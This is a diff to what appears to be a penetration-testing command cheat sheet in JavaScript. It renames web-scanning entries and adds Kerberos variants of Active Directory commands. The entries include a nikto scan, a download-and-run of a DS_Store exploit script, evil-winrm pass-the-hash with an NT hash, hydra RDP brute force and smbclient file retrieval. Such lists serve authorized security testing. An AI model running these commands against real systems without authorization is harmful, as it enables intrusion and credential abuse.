@@ -612,18 +612,18 @@ const webCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
-            "name": "nikto",
+            "name": "Nikto",
             "command": "nikto -h http://{ip}",
             "meta": ["linux", "mac", "windows"]
         },
         {
-            "name": "ds store exploit",
-            "command": "wget https://github.com/lijiejie/ds_store_exp/raw/refs/heads/master/ds_store_exp.py && pip install ds-store requests && python ds_store_exp.py http://{ip}/.DS_Store",
+            "name": "DS Store Discovery",
+            "command": "wget https://github.com/lijiejie/ds_store_exp/raw/refs/heads/master/ds_store_exp.py\npip install ds-store requests\npython ds_store_exp.py http://{ip}/.DS_Store",
             "meta": ["linux", "mac"]
         },
         {
-            "name": "feroxbuster directory scan",
-            "command": "feroxbuster -u http://{fqdn} -C 404 -C 500",
+            "name": "Feroxbuster",
+            "command": "feroxbuster -u http://{domain} -C 404 -C 500",
             "meta": ["linux", "mac"]
         },
         {
@@ -758,6 +758,11 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac"]
 },
 {
+"name": "winrm pth (kerberos)",
+"command": "evil-winrm -i {ip} -u {user} -H {nthash} -r {adDomain}",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "rdp brute",
 "command": "hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://{ip}",
 "meta": ["linux","mac"]
@@ -768,9 +773,19 @@ const activeDirectoryCommands = withCommandType(
 "meta": ["linux","mac"]
 },
 {
+"name": "smbclient list (kerberos)",
+"command": "smbclient -L \\{ip} -U '{user}%{password}' -k",
+"meta": ["linux","mac","kerberos"]
+},
+{
 "name": "smbclient get",
 "command": "smbclient \\{ip}\{share} -U '{user}%{password}' -c 'get {remote} {local}'",
 "meta": ["linux","mac"]
+},
+{
+"name": "smbclient get (kerberos)",
+"command": "smbclient \\{ip}\{share} -U '{user}%{password}' -k -c 'get {remote} {local}'",
+"meta": ["linux","mac","kerberos"]
 },
 {
 "name": "smbclient put",
